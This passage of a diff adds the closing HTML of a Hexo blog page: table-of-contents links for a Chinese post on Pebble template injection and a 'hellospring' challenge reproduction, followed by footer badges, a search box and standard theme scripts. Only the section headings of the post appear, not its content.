+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0X00-%E5%89%8D%E8%A8%80"><span class="nav-text">0X00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X01-%E4%BB%80%E4%B9%88%E6%98%AFSSTI-%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5"><span class="nav-text">0X01 什么是SSTI(模版注入)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81-%E6%A8%A1%E7%89%88%E5%BC%95%E6%93%8E"><span class="nav-text">1、 模版引擎</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81ssti%EF%BC%88%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-text">2、ssti（模版注入）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X02-JSP%E6%98%AF%E6%A8%A1%E7%89%88%E5%BC%95%E6%93%8E%E5%90%97%EF%BC%9F"><span class="nav-text">0X02 JSP是模版引擎吗？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X03-Pebble%E6%A8%A1%E7%89%88"><span class="nav-text">0X03 Pebble模版</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E7%AE%80%E4%BB%8B"><span class="nav-text">1、简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A%E7%A4%BA%E4%BE%8B"><span class="nav-text">2、数据绑定示例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0"><span class="nav-text">3、漏洞原因</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X04-hellospring%E5%A4%8D%E7%8E%B0"><span class="nav-text">0X04 hellospring复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">1、环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83%E5%88%86%E6%9E%90"><span class="nav-text">2、题目环境分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="nav-text">3、目录穿越</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4%E3%80%81%E6%80%9D%E8%B7%AF"><span class="nav-text">4、思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5%E3%80%81%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0"><span class="nav-text">5、本地复现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X05-%E6%80%BB%E7%BB%93"><span class="nav-text">0X05 总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X06-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-text">0X06 参考文章</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X07-%E5%8E%9F%E6%96%87%E5%9C%B0%E5%9D%80"><span class="nav-text">0X07 原文地址</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="border-box website-info-box shields">
+        
+            <div class="info-item">
+                
+                <a class="shields-item">
+                    <img src="https://img.shields.io/badge/Since-2023_--_2024-dodgerblue?style=flat-square">
+                </a>
+                
+                    <a class="shields-item" href="/blog/">
+                        <img src="https://img.shields.io/badge/WebMaster-Yu9-dodgerblue?style=flat-square">
+                    </a>
+                
+                
+                <a class="shields-item" href="https://hexo.io" target="_blank">
+                    <img src="https://img.shields.io/badge/Powered_by-Hexo-dodgerblue?style=flat-square">
+                </a>
+                <a class="shields-item" href="https://github.com/XPoet/hexo-theme-keep" target="_blank">
+                    <img class="shields-keep-version" src="https://img.shields.io/badge/Theme-Keep-dodgerblue?style=flat-square">
+                </a>
+                
+            </div>
+            
+                <div class="info-item">
+                    
+                        
+                    
+                </div>
+            
+        
+
+        <div class="count-item info-item shields">
+            
+                <span class="count-box border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">40.7k</span>
+                </span>
+            
+
+            
+                <span class="count-box border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-box border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-toggle-theme-mode flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0X00-%E5%89%8D%E8%A8%80"><span class="nav-text">0X00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X01-%E4%BB%80%E4%B9%88%E6%98%AFSSTI-%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5"><span class="nav-text">0X01 什么是SSTI(模版注入)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81-%E6%A8%A1%E7%89%88%E5%BC%95%E6%93%8E"><span class="nav-text">1、 模版引擎</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81ssti%EF%BC%88%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-text">2、ssti（模版注入）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X02-JSP%E6%98%AF%E6%A8%A1%E7%89%88%E5%BC%95%E6%93%8E%E5%90%97%EF%BC%9F"><span class="nav-text">0X02 JSP是模版引擎吗？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X03-Pebble%E6%A8%A1%E7%89%88"><span class="nav-text">0X03 Pebble模版</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E7%AE%80%E4%BB%8B"><span class="nav-text">1、简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A%E7%A4%BA%E4%BE%8B"><span class="nav-text">2、数据绑定示例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0"><span class="nav-text">3、漏洞原因</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X04-hellospring%E5%A4%8D%E7%8E%B0"><span class="nav-text">0X04 hellospring复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">1、环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83%E5%88%86%E6%9E%90"><span class="nav-text">2、题目环境分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="nav-text">3、目录穿越</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4%E3%80%81%E6%80%9D%E8%B7%AF"><span class="nav-text">4、思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5%E3%80%81%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0"><span class="nav-text">5、本地复现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X05-%E6%80%BB%E7%BB%93"><span class="nav-text">0X05 总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X06-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-text">0X06 参考文章</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X07-%E5%8E%9F%E6%96%87%E5%9C%B0%E5%9D%80"><span class="nav-text">0X07 原文地址</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/libs/anime.min.js"></script>
+
+<!-- local-search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/local-search.min.js"></script>
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/post/share.min.js"></script>
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+    
+
+</body>
+</html>
